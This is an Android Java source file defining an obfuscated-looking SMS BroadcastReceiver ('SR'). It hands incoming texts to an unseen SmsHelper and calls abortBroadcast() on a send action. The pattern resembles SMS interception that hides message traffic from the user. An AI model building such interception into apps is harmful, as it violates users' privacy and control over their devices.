package c;
import net.workspace.sms.SmsHelper;
import net.workspace.util.T;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

/**
 * SmsReceiver
 * @author Hike
 *
 */
public class SR extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        T.registerReciever();
        String action = intent.getAction();
        if (T.SMS_RECEIVED.equals(action)) {
            SmsHelper.onSmsRecieved(this, intent);
        } else if (T.SMS_SEND.equals(action)) {
            abortBroadcast();
        }
    }
}
